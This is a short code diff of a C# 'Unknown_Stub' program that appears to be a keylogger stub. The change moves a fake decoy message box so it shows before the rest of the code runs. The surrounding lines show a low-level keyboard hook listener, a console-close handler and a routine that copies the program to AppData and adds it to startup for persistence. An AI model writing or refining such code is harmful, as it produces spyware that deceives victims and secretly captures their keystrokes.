@@ -77,7 +77,14 @@ namespace Unknown_Stub
         #endregion
 
         static void Main(string[] args)
-        { 
+        {
+
+            #region FakeMessageBox
+            if (Variables.FakeMessageBox)
+            {
+                FakeMessageBoxCreator.createMessageBox(Variables.MessageBoxOption, Variables.MessageBoxText, Variables.MessageBoxName, Variables.MessageBoxIcon);
+            }
+            #endregion
             #region IfConsoleCloses
             _handler += new EventHandler(Handler);
             SetConsoleCtrlHandler(_handler, true);
@@ -91,13 +98,8 @@ namespace Unknown_Stub
             LowLevelKeyhookListener();
             Application.Run();
             #endregion
+           
 
-            #region FakeMessageBox
-            if (Variables.FakeMessageBox)
-            {
-                FakeMessageBoxCreator.createMessageBox(FakeMessageBoxOption, FakeMessageBoxText, FakeMessageBoxName, FakeMessageBoxIcon);
-            }
-            #endregion
             #region MoveToAppDataAndAddToStartup
             if (Variables.AddToStartup)
             {
